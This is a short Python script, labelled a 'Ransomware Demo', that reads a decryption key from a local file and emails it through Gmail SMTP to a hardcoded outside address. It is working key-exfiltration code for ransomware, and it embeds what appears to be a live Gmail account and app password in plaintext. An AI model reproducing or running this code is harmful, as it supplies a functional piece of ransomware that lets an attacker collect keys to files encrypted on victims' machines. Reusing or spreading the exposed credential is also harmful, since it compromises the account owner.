import smtplib
from email.mime.text import MIMEText
import os

# Customize these with your sender credentials
SENDER_EMAIL = "somumacos@gmail.com"
SENDER_APP_PASSWORD = "xbbm bjkx pxub ppkb"
RECEIVER_EMAIL = "som.x2207@gmail.com"

KEY_FILE_PATH = "path_to_your_key_file/key.txt"  # Path to the key file

def get_key_from_file():
    """ Read the decryption key from the key file. """
    try:
        with open(KEY_FILE_PATH, 'r') as file:
            key = file.read().strip()  # Read and remove any extra spaces or newlines
        return key
    except FileNotFoundError:
        print("[!] Key file not found!")
        return None
    except Exception as e:
        print(f"[!] Failed to read key file: {e}")
        return None

def send_key_via_email(key):
    """ Send the decryption key via email. """
    if not key:
        print("[!] No key to send.")
        return

    try:
        subject = "🔐 Decryption Key from Ransomware Demo"
        body = f"Here is the decryption key:\n\n{key}\n\nKeep this safe to recover encrypted files."

        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECEIVER_EMAIL

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_APP_PASSWORD)
            server.send_message(msg)

        print(f"[✓] Key sent to {RECEIVER_EMAIL}")
    except Exception as e:
        print(f"[!] Failed to send key: {e}")

if __name__ == "__main__":
    # Fetch the key from the key file
    key = get_key_from_file()

    # If the key is found, send it via email
    send_key_via_email(key)
